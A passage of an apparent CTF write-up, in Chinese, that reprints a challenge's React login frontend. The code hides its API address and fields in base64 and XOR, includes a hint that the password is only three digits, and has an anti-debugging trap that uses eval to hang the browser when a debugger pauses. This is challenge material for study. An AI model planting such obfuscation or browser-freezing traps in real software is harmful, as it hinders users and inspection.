class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"9"</span>: [<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>]&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x5-题目源码"><a href="#0x5-题目源码" class="headerlink" title="0x5 题目源码"></a>0x5 题目源码</h4><h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><h6 id="App-tsx"><a href="#App-tsx" class="headerlink" title="App.tsx"></a>App.tsx</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> Drawer, &#123;drawerWidth&#125; <span class="keyword">from</span> <span class="string">"./Drawer"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    Button,</span><br><span class="line">    Card,</span><br><span class="line">    createStyles, LinearProgress, Link,</span><br><span class="line">    List,</span><br><span class="line">    ListItem,</span><br><span class="line">    TextField,</span><br><span class="line">    Theme,</span><br><span class="line">    withStyles</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">"@material-ui/core"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123;Base64&#125; <span class="keyword">from</span> <span class="string">"js-base64"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> t = Base64.fromBase64;</span><br><span class="line"><span class="keyword">const</span> w = Base64.fromBase64</span><br><span class="line"><span class="keyword">const</span> _ = fetch;</span><br><span class="line"><span class="keyword">const</span> __ = <span class="function">(<span class="params">x: number, y: number</span>) =&gt;</span> x ^ y</span><br><span class="line"><span class="keyword">const</span> ___ = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">53</span>, <span class="number">69</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">70</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">69</span>, <span class="number">69</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">51</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">70</span>, <span class="number">70</span>, <span class="number">57</span>])</span><br><span class="line"><span class="keyword">const</span> url = w(<span class="string">"aHR0cDovLzQ3LjEwNy4yNTEuNDEvYXBpLw=="</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useStyles = <span class="function">(<span class="params">theme: Theme</span>) =&gt;</span> createStyles(&#123;</span><br><span class="line">    main: &#123;</span><br><span class="line">        flexGrow: <span class="number">1</span>,</span><br><span class="line">        padding: theme.spacing(<span class="number">3</span>),</span><br><span class="line">        [theme.breakpoints.up(<span class="string">'sm'</span>)]: &#123;</span><br><span class="line">            marginLeft: drawerWidth</span><br><span class="line">        &#125;,</span><br><span class="line">        height: <span class="string">"100%"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    toolbar: theme.mixins.toolbar,</span><br><span class="line">    paper: &#123;</span><br><span class="line">        display: <span class="string">"table"</span>,</span><br><span class="line">        margin: <span class="string">"0 auto"</span>,</span><br><span class="line">        width: <span class="number">300</span>,</span><br><span class="line">        height: <span class="number">300</span>,</span><br><span class="line">        marginTop: <span class="number">160</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    input: &#123;</span><br><span class="line">        width: <span class="number">280</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    input2: &#123;</span><br><span class="line">        width: <span class="number">280</span> - <span class="number">63</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    center: &#123;</span><br><span class="line">        textAlign: <span class="string">"center"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    p: &#123;</span><br><span class="line">        width: <span class="string">"100%"</span>,</span><br><span class="line">        textAlign: <span class="string">"center"</span>,</span><br><span class="line">        fontSize: <span class="string">"20px"</span>,</span><br><span class="line">        margin: <span class="string">"0 auto"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    btn: &#123;</span><br><span class="line">        margin: <span class="string">"0 0 0 auto"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    hidden: &#123;</span><br><span class="line">        visibility: <span class="string">"hidden"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">interface State &#123;</span><br><span class="line">    p: string,</span><br><span class="line">    c: string,</span><br><span class="line">    w: string,</span><br><span class="line">    g: string,</span><br><span class="line">    l: boolean</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span>&lt;<span class="title">any</span>, <span class="title">State</span>&gt; </span>&#123;</span><br><span class="line">    private __: &#123; p(b: string): string; q(p: string, <span class="attr">c</span>: string, <span class="attr">y</span>: string): <span class="built_in">Promise</span>&lt;any&gt;; y(): <span class="built_in">Promise</span>&lt;any&gt; &#125;;</span><br><span class="line">    <span class="keyword">constructor</span>(props: any) &#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">        <span class="keyword">this</span>.__ = &#123;</span><br><span class="line">            <span class="keyword">async</span> y() &#123;</span><br><span class="line">                <span class="keyword">return</span> _(url)</span><br><span class="line">                    .then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="keyword">async</span> q(p: string, <span class="attr">c</span>: string, <span class="attr">y</span>: string) &#123;</span><br><span class="line">                <span class="keyword">return</span> _(url, &#123;</span><br><span class="line">                    [w(<span class="string">"bWV0aG9k"</span>)]: w(<span class="string">"UE9TVA=="</span>),</span><br><span class="line">                    [w(<span class="string">"bW9kZQ=="</span>)]: w(<span class="string">"Y29ycw=="</span>),</span><br><span class="line">                    [w(<span class="string">"aGVhZGVycw=="</span>)]: &#123;</span><br><span class="line">                        [w(<span class="string">"Q29udGVudC1UeXBl"</span>)]: w(<span class="string">"YXBwbGljYXRpb24vanNvbg=="</span>)</span><br><span class="line">                    &#125;,</span><br><span class="line">                    [w(<span class="string">"Ym9keQ=="</span>)]: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                        [w(<span class="string">"dXVpZA=="</span>)]: y,</span><br><span class="line">                        [w(<span class="string">"Y29kZQ=="</span>)]: c,</span><br><span class="line">                        [w(<span class="string">"cGFzc3dvcmQ="</span>)]: p</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (res.status !== <span class="number">200</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(res.status.toString())</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> res.json())</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">            p(b: string): string &#123;</span><br><span class="line">                <span class="keyword">const</span> input = Base64.toUint8Array(b);</span><br><span class="line">                input.forEach(<span class="function">(<span class="params">_, i</span>) =&gt;</span> &#123;</span><br><span class="line">                    ___.forEach(<span class="function">(<span class="params">_, j</span>) =&gt;</span> &#123;</span><br><span class="line">                        input[i] = __(input[i], ___[j])</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">Array</span>.from(input).map(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">String</span>.fromCharCode(value)).join(<span class="string">""</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    readonly state: Readonly&lt;State&gt; = &#123;</span><br><span class="line">        p: <span class="string">""</span>,</span><br><span class="line">        c: <span class="string">""</span>,</span><br><span class="line">        w: <span class="string">""</span>,</span><br><span class="line">        g: <span class="string">""</span>,</span><br><span class="line">        l: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">        <span class="keyword">this</span>.u()</span><br><span class="line">        setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> time1 = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime()</span><br><span class="line">            <span class="keyword">debugger</span>;</span><br><span class="line">            <span class="keyword">const</span> time2 = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() - time1</span><br><span class="line">            <span class="keyword">if</span> (time2 &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="string">`const wait = async () =&gt; &#123;</span></span><br><span class="line"><span class="string">                    wait()</span></span><br><span class="line"><span class="string">                    let total = "";</span></span><br><span class="line"><span class="string">                    for (let i = 0; i &lt; 1e9; i++) &#123;</span></span><br><span class="line"><span class="string">                        total = total + i.toString();</span></span><br><span class="line"><span class="string">                        history.pushState(0, "", total);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                wait()`</span>)</span><br><span class="line">                <span class="built_in">Array</span>.from(&#123;</span><br><span class="line">                    [<span class="built_in">Symbol</span>.iterator]: <span class="function"><span class="params">()</span> =&gt;</span> (&#123;</span><br><span class="line">                        next: <span class="function"><span class="params">()</span> =&gt;</span> (&#123;<span class="attr">value</span>: <span class="built_in">Math</span>.random()&#125;)</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    u = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        (<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">            <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="keyword">this</span>.__.y();</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">                g: data[<span class="string">"img"</span>],</span><br><span class="line">                p: <span class="keyword">this</span>.__.p(data[t(<span class="string">"dXVpZA=="</span>)])</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        (<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.setState(&#123;<span class="attr">l</span>: <span class="literal">true</span>&#125;)</span><br><span class="line">                <span class="keyword">const</span> &#123;msg&#125; = <span class="keyword">await</span> <span class="keyword">this</span>.__.q(<span class="keyword">this</span>.state.w, <span class="keyword">this</span>.state.c, <span class="keyword">this</span>.state.p)</span><br><span class="line">                alert(msg)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                alert(e)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.u()</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;<span class="attr">l</span>: <span class="literal">false</span>&#125;)</span><br><span class="line">        &#125;)()</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        alert(<span class="string">"密码只有3位数字哦!"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    e = <span class="function">(<span class="params">event: any</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">w</span>: event.target.value&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    i = <span class="function">(<span class="params">event: any</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.setState(&#123;<span class="attr">c</span>: event.target.value&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;classes&#125; = <span class="keyword">this</span>.props</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div&gt;</span><br><span class="line">                &lt;Drawer/&gt;</span><br><span class="line">                &lt;main className=&#123;classes.main&#125;&gt;</span><br><span class="line">                    &lt;div className=&#123;classes.toolbar&#125;/&gt;</span><br><span class="line">                    &lt;Card className=&#123;classes.paper&#125;&gt;</span><br><span class="line">                        &lt;List&gt;</span><br><span class="line">                            &lt;ListItem&gt;</span><br><span class="line">                                &lt;p className=&#123;classes.p&#125;&gt;登录&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;/</span>ListItem&gt;</span><br><span class="line">                            &lt;ListItem&gt;</span><br><span class="line">                                &lt;TextField className=&#123;classes.input&#125; label=<span class="string">"用户识别码"</span> type=<span class="string">"password"</span> onChange=&#123;<span class="keyword">this</span>.e&#125;/&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;ListItem className=&#123;this.state.g.length === 0? classes.hidden: ""&#125;&gt;</span></span><br><span class="line"><span class="regexp">                                &lt;TextField className=&#123;classes.input2&#125; label="验证码" onChange=&#123;this.i&#125;/</span>&gt;</span><br><span class="line">                                &lt;img width=&#123;<span class="number">63</span>&#125; height=&#123;<span class="number">24</span>&#125; src=&#123;<span class="keyword">this</span>.state.g&#125;/&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;ListItem&gt;</span></span><br><span class="line"><span class="regexp">                                &lt;Link onClick=&#123;this.g&#125;&gt;</span></span><br><span class="line"><span class="regexp">                                    忘记了你的用户识别码?</span></span><br><span class="line"><span class="regexp">                                &lt;/</span>Link&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;ListItem&gt;</span></span><br><span class="line"><span class="regexp">                                &lt;p style=&#123;&#123;color: "#909399"&#125;&#125;&gt;0202年了, 是时候了解下最新的前端技术了&lt;/</span>p&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                            &lt;ListItem&gt;</span></span><br><span class="line"><span class="regexp">                                &lt;Button className=&#123;classes.btn&#125; variant="contained" color="primary" onClick=&#123;this.w&#125;&gt;</span></span><br><span class="line"><span class="regexp">                                    登录</span></span><br><span class="line"><span class="regexp">                                &lt;/</span>Button&gt;</span><br><span class="line">                            &lt;<span class="regexp">/ListItem&gt;</span></span><br><span class="line"><span class="regexp">                        &lt;/</span>List&gt;</span><br><span class="line">                        &#123;<span class="keyword">this</span>.state.l &amp;&amp; <span class="xml"><span class="tag">&lt;<span class="name">LinearProgress</span> /&gt;</span></span>&#125;</span><br><span class="line">                    &lt;<span class="regexp">/Card&gt;</span></span><br><span class="line"><span class="regexp">                &lt;/m</span>ain&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default withStyles(useStyles)(App)</span></span><br></pre></td></tr></table></figure>

<h6 id="Drawer-tsx"><a href="#Drawer-tsx" class="headerlink" title="Drawer.tsx"></a>Drawer.tsx</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 